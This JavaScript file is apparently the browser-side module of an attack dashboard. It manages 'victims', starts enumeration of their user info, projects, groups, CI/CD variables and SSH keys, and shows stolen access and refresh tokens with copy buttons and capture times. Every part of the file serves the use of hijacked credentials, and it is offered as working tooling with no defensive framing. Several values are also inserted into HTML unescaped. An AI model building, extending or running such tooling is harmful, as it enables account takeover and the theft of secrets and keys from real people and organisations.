/**
 * Enumeration Module - Handles victim enumeration UI and progress
 */

// State
let currentVictimForEnumeration = null;
let currentOperationForEnumeration = null;
let lastEnumeratedVictimId = null;
let enumerationMonitorInterval = null;
let seenActivityIds = new Set();
let enumerationResults = null;

// ==================== MODAL FUNCTIONS ====================

function showEnumerationModal(victimId, operationId) {
    currentVictimForEnumeration = victimId;
    currentOperationForEnumeration = operationId;
    document.getElementById('enumeration-modal').style.display = 'block';
}

function closeEnumerationModal() {
    document.getElementById('enumeration-modal').style.display = 'none';
    currentVictimForEnumeration = null;
    currentOperationForEnumeration = null;
}

function closeEnumerationProgressModal() {
    if (enumerationMonitorInterval) {
        clearInterval(enumerationMonitorInterval);
        enumerationMonitorInterval = null;
    }
    document.getElementById('enumeration-progress-modal').style.display = 'none';
}

function closeEnumerationResultsModal() {
    document.getElementById('enumeration-results-modal').style.display = 'none';
}

// ==================== ENUMERATION START ====================

async function startEnumeration(event) {
    event.preventDefault();
    
    if (!currentVictimForEnumeration || !currentOperationForEnumeration) {
        showNotification('Error', 'No victim selected', 'error');
        return;
    }
    
    const form = event.target;
    const formData = new FormData(form);
    
    const options = {
        enum_user: formData.get('enum_user') === 'true',
        enum_projects: formData.get('enum_projects') === 'true',
        enum_groups: formData.get('enum_groups') === 'true',
        enum_ci_variables: formData.get('enum_ci_variables') === 'true',
        enum_ssh_keys: formData.get('enum_ssh_keys') === 'true'
    };
    
    const victimId = currentVictimForEnumeration;
    const operationId = currentOperationForEnumeration;
    
    closeEnumerationModal();
    showEnumerationProgressModal(options);
    
    try {
        const response = await fetch(`/api/victims/${victimId}/enumerate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(options)
        });
        
        const result = await response.json();
        
        if (response.ok) {
            monitorEnumerationProgress(victimId, operationId, options);
        } else {
            addEnumerationLog('Error: ' + (result.error || 'Unknown error'), 'error');
            updateEnumerationStatus('Enumeration failed');
            updateEnumerationProgress(100);
            document.getElementById('enumeration-close-button').disabled = false;
        }
    } catch (error) {
        console.error('Error starting enumeration:', error);
        addEnumerationLog('Error: ' + (error.message || 'Network error'), 'error');
        updateEnumerationStatus('Enumeration failed');
        updateEnumerationProgress(100);
        document.getElementById('enumeration-close-button').disabled = false;
    }
}

// ==================== PROGRESS MODAL ====================

function showEnumerationProgressModal(options) {
    document.getElementById('enumeration-progress-bar').style.width = '0%';
    document.getElementById('enumeration-progress-bar').textContent = '0%';
    document.getElementById('enumeration-status').textContent = 'Initializing...';
    document.getElementById('enumeration-log').innerHTML = '';
    document.getElementById('enumeration-close-button').disabled = true;
    document.getElementById('enumeration-view-results-button').style.display = 'none';
    
    document.getElementById('enumeration-progress-modal').style.display = 'block';
    
    addEnumerationLog('Starting enumeration...', 'info');
    
    if (options.enum_user) addEnumerationLog('✓ User information enabled', 'info');
    if (options.enum_projects) addEnumerationLog('✓ Projects enumeration enabled', 'info');
    if (options.enum_groups) addEnumerationLog('✓ Groups enumeration enabled', 'info');
    if (options.enum_ci_variables) addEnumerationLog('✓ CI/CD variables enabled', 'info');
    if (options.enum_ssh_keys) addEnumerationLog('✓ SSH keys enumeration enabled', 'info');
}

function addEnumerationLog(message, type = 'info') {
    const logContainer = document.getElementById('enumeration-log');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    logContainer.appendChild(entry);
    logContainer.scrollTop = logContainer.scrollHeight;
}

function updateEnumerationStatus(status) {
    document.getElementById('enumeration-status').textContent = status;
}

function updateEnumerationProgress(percentage) {
    const progressBar = document.getElementById('enumeration-progress-bar');
    progressBar.style.width = percentage + '%';
    progressBar.textContent = Math.round(percentage) + '%';
}

// ==================== PROGRESS MONITORING ====================

async function monitorEnumerationProgress(victimId, operationId, options) {
    let progress = 10;
    let hasStarted = false;
    let isComplete = false;
    let lastActivityTimestamp = null;
    
    lastEnumeratedVictimId = victimId;
    seenActivityIds.clear();
    
    updateEnumerationProgress(progress);
    addEnumerationLog('Waiting for enumeration to start...', 'info');
    
    enumerationMonitorInterval = setInterval(async () => {
        if (isComplete) {
            clearInterval(enumerationMonitorInterval);
            return;
        }
        
        try {
            const response = await fetch(`/api/activity/${operationId}?limit=50`);
            const activities = await response.json();
            
            // Process activities in chronological order
            const sortedActivities = activities.sort((a, b) => 
                new Date(a.timestamp) - new Date(b.timestamp)
            );
            
            for (const activity of sortedActivities) {
                // Skip if we've seen this activity
                if (seenActivityIds.has(activity.id)) continue;
                seenActivityIds.add(activity.id);
                
                const eventType = activity.event_type;
                const message = activity.message;
                
                console.log('New activity:', eventType, message);
                
                if (eventType === 'enumeration_started') {
                    hasStarted = true;
                    addEnumerationLog('✓ Enumeration started', 'success');
                    updateEnumerationStatus('Enumerating resources...');
                    progress = 40;
                    updateEnumerationProgress(progress);
                    
                } else if (eventType === 'enumeration_complete') {
                    addEnumerationLog('✓ ' + message, 'success');
                    updateEnumerationStatus('✓ Enumeration completed!');
                    progress = 100;
                    updateEnumerationProgress(progress);
                    isComplete = true;
                    
                    await loadEnumerationResults(victimId);
                    
                    document.getElementById('enumeration-close-button').disabled = false;
                    document.getElementById('enumeration-view-results-button').style.display = 'inline-block';
                    
                    if (window.updateVictims) await window.updateVictims();
                    if (window.updateStats) await window.updateStats();
                    

                    updateEnumerationProgress(progress);
                    
                } else if (eventType === 'enumeration_error') {
                    addEnumerationLog('✗ ' + message, 'error');
                    updateEnumerationStatus('✗ Enumeration failed');
                    progress = 100;
                    updateEnumerationProgress(progress);
                    isComplete = true;
                    document.getElementById('enumeration-close-button').disabled = false;
                }
            }
            
            // Gradually increment progress
            if (hasStarted && !isComplete && progress < 90) {
                progress += 2;
                updateEnumerationProgress(progress);
            } else if (!hasStarted && progress < 30) {
                progress += 1;
                updateEnumerationProgress(progress);
            }
            
        } catch (error) {
            console.error('Error monitoring:', error);
        }
    }, 1000);
    
    // Timeout after 2 minutes
    setTimeout(() => {
        if (enumerationMonitorInterval && !isComplete) {
            clearInterval(enumerationMonitorInterval);
            addEnumerationLog('Monitoring timeout', 'warning');
            updateEnumerationStatus('Timeout - check activity log');
            updateEnumerationProgress(100);
            document.getElementById('enumeration-close-button').disabled = false;
            document.getElementById('enumeration-view-results-button').style.display = 'inline-block';
        }
    }, 120000);
}

// ==================== RESULTS ====================

async function loadEnumerationResults(victimId) {
    try {
        const [victimRes, tokenRes] = await Promise.all([
            fetch(`/api/victims/${victimId}`),
            fetch(`/api/victims/${victimId}/token`)
        ]);
        
        const victim = await victimRes.json();
        const token = tokenRes.ok ? await tokenRes.json() : null;
        
        enumerationResults = {
            victim,
            token,
            victimId
        };
    } catch (error) {
        console.error('Error loading results:', error);
    }
}

async function viewEnumerationResults() {
    closeEnumerationProgressModal();
    
    if (!enumerationResults) {
        if (lastEnumeratedVictimId) {
            await loadEnumerationResults(lastEnumeratedVictimId);
        } else {
            showNotification('Error', 'No results available', 'error');
            return;
        }
    }
    
    renderEnumerationResults();
    document.getElementById('enumeration-results-modal').style.display = 'block';
}

function renderEnumerationResults() {
    if (!enumerationResults) return;
    
    const { victim, token } = enumerationResults;
    const container = document.getElementById('enumeration-results-content');
    
    // Helper functions (use window.escapeHtml if available, otherwise define locally)
    const escape = window.escapeHtml || function(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    };
    
    const formatDT = window.formatDateTime || function(dateString) {
        if (!dateString) return 'N/A';
        return new Date(dateString).toLocaleString();
    };
    
    let html = '<div class="results-container">';
    
    // User Info Section
    html += '<div class="results-section">';
    html += '<h3>👤 User Information</h3>';
    html += '<div class="results-grid">';
    html += `<div class="result-item"><span class="label">Username:</span><span class="value">${escape(victim.username) || 'N/A'}</span></div>`;
    html += `<div class="result-item"><span class="label">Email:</span><span class="value">${escape(victim.email) || 'N/A'}</span></div>`;
    html += `<div class="result-item"><span class="label">User ID:</span><span class="value">${victim.user_id || 'N/A'}</span></div>`;
    html += `<div class="result-item"><span class="label">Status:</span><span class="value"><span class="status-badge status-${victim.status}">${victim.status}</span></span></div>`;
    html += '</div></div>';
    
    // Tokens Section
    if (token) {
        html += '<div class="results-section">';
        html += '<h3>🔑 Access Tokens</h3>';
        html += '<div class="token-box">';
        html += '<div class="token-header">Access Token</div>';
        html += `<div class="token-value">${escape(token.access_token)}</div>`;
        html += `<button class="btn btn-small" onclick="window.copyToClipboard('${token.access_token}')">Copy</button>`;
        html += '</div>';
        
        if (token.refresh_token) {
            html += '<div class="token-box">';
            html += '<div class="token-header">Refresh Token</div>';
            html += `<div class="token-value">${escape(token.refresh_token)}</div>`;
            html += `<button class="btn btn-small" onclick="window.copyToClipboard('${token.refresh_token}')">Copy</button>`;
            html += '</div>';
        }
        
        html += `<div class="token-meta">Scope: ${token.scope || 'N/A'} | Captured: ${formatDT(token.captured_at)}</div>`;
        html += '</div>';
    }
    
    // JSON View
    html += '<div class="results-section">';
    html += '<h3>📄 Raw JSON</h3>';
    html += '<div class="json-tabs">';
    html += '<button class="json-tab active" onclick="window.showJsonTab(\'victim\', event)">Victim</button>';
    html += '<button class="json-tab" onclick="window.showJsonTab(\'token\', event)">Token</button>';
    html += '</div>';
    html += `<pre class="json-view" id="json-victim">${JSON.stringify(victim, null, 2)}</pre>`;
    html += `<pre class="json-view" style="display:none" id="json-token">${JSON.stringify(token, null, 2)}</pre>`;
    html += '</div>';
    
    html += '</div>';
    
    container.innerHTML = html;
}

function showJsonTab(tab, event) {
    document.querySelectorAll('.json-tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.json-view').forEach(v => v.style.display = 'none');
    
    if (event && event.target) {
        event.target.classList.add('active');
    }
    document.getElementById(`json-${tab}`).style.display = 'block';
}

// Redirect to enumeration results page
function redirectToEnumerationResults() {
    if (lastEnumeratedVictimId) {
        window.location.href = `/enumeration/${lastEnumeratedVictimId}`;
    } else {
        alert('No victim ID available');
    }
}

// Export functions
window.showEnumerationModal = showEnumerationModal;
window.closeEnumerationModal = closeEnumerationModal;
window.closeEnumerationProgressModal = closeEnumerationProgressModal;
window.closeEnumerationResultsModal = closeEnumerationResultsModal;
window.startEnumeration = startEnumeration;
window.viewEnumerationResults = viewEnumerationResults;
window.redirectToEnumerationResults = redirectToEnumerationResults;
window.showJsonTab = showJsonTab;
